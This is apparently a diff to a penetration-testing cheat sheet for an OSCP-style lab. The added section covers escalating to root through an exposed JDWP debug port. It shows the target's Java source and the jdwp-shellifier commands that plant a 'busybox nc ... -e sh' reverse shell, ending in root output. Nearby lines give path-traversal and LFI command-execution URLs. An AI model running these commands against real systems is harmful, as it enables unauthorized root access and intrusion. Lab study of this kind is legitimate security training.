@@ -1692,6 +1692,67 @@ curl 127.0.0.1:8000
 127.0.0.1:8000/backend/?view=../../../../../etc/passwd
 127.0.0.1:8000/backend/?view=../../../../../var/crash/test.php&cmd=id
 ````
+### processes
+#### JDWP
+````
+root         852  0.0  3.9 2536668 80252 ?       Ssl  May16   0:04 java -Xdebug Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
+````
+````
+dev@oscp:/opt/stats$ cat App.java
+cat App.java
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.ServerSocket;
+import java.net.Socket;
+
+class StatsApp {
+    public static void main(String[] args) {
+        System.out.println("System Stats\n");
+        Runtime rt = Runtime.getRuntime();
+        String output = new String();
+
+        try {
+            ServerSocket echod = new ServerSocket(5000);
+            while (true) {
+              output = "";
+              output += "Available Processors: " + rt.availableProcessors() +"\r\n";
+              output += "Free Memory: " + rt.freeMemory() + "\r\n";
+              output += "Total Memory: " + rt.totalMemory() +"\r\n";
+
+              Socket socket = echod.accept();
+              InputStream in = socket.getInputStream();
+              OutputStream out = socket.getOutputStream();
+              out.write((output + "\r\n").getBytes());
+              System.out.println(output);
+            }
+        } catch (IOException e) {
+            System.err.println(e.toString());
+            System.exit(1);
+        }
+    }
+}
+
+````
+
+````
+https://github.com/IOActive/jdwp-shellifier
+````
+
+````
+proxychains python2 jdwp-shellifier.py -t 127.0.0.1
+nc -nv 192.168.234.150 5000 #this port runs on the app.java, do this to trigger it
+````
+##### RCE
+````
+proxychains python2 jdwp-shellifier.py -t 127.0.0.1 --cmd "busybox nc 192.168.45.191 80 -e sh"
+nc -nv 192.168.234.150 5000 #to trigger alert
+nc -nlvp 80
+listening on [any] 80 ...
+connect to [192.168.45.191] from (UNKNOWN) [192.168.234.150] 59382
+id
+uid=0(root) gid=0(root)
+````
 ### Kernel Expoits
 #### CVE-2022-0847
 ````
